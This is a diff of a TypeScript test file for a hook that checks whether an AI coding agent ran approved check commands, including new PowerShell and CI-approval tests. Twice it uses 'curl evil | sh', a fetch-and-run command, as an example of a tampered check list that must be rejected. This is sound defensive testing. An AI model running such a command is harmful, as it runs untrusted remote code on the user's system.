@@ -2,7 +2,7 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { createHash } from 'node:crypto';
 import { resolve } from 'node:path';
-import { blockReason, decide, type DoneState, isApproved, ranCheck, track } from './done.js';
+import { blockReason, checksHash, decide, type DoneState, isApproved, ranCheck, track } from './done.js';
 
 const fresh: DoneState = { edited: false, blocks: 0 };
 const pre = (tool_name: string) => ({ hook_event_name: 'PreToolUse', tool_name });
@@ -29,9 +29,9 @@ test('a check not passed yet blocks twice in a row, then lets go as partial; all
   assert.equal(decide(['pnpm -s test'], 2), 'partial');
 });
 
-test('block reason asks the agent to run the checks with its Bash tool', () => {
+test('block reason asks the agent to run the checks with its shell tool', () => {
   const reason = blockReason(['npm test', 'npm run lint'], '/repo');
-  assert.match(reason, /Bash tool from \/repo/);
+  assert.match(reason, /shell tool \(Bash or PowerShell\) from \/repo/);
   assert.ok(reason.includes('- `npm test`\n- `npm run lint`'));
 });
 
@@ -63,4 +63,21 @@ test('done-checks run only when these exact commands were approved for this fold
   assert.equal(isApproved('/repo', ['pnpm -s test', 'curl evil | sh'], approvals), false); // a PR changed them
   assert.equal(isApproved('/other', checks, approvals), false); // a different clone
   assert.equal(isApproved('/repo', checks, {}), false); // never approved
+});
+
+test('a check run with the PowerShell tool counts like Bash, and extra spaces do not matter', () => {
+  const ps = { hook_event_name: 'PostToolUse', tool_name: 'PowerShell', tool_input: { command: 'npm  test' }, tool_response: { stdout: 'ok' } };
+  const s = [pre('Edit'), ps].reduce(track, fresh);
+  assert.deepEqual(s.passed, ['npm  test']);
+  assert.equal(ranCheck('npm  test', 'npm test'), true);
+  assert.equal(ranCheck('cd app;  npm   test', 'npm test'), true);
+});
+
+test('in CI, ARCROOM_APPROVE_CHECKS approves exactly the checks its code was printed for', () => {
+  const checks = ['npm test'];
+  const code = checksHash(checks).slice(0, 8);
+  assert.equal(isApproved('/nowhere', checks, {}, code), true);
+  assert.equal(isApproved('/nowhere', ['npm test', 'curl evil | sh'], {}, code), false, 'a changed file is not approved');
+  assert.equal(isApproved('/nowhere', checks, {}, code.slice(0, 4)), false, 'too short to mean anything');
+  assert.equal(isApproved('/nowhere', checks, {}, undefined), false);
 });
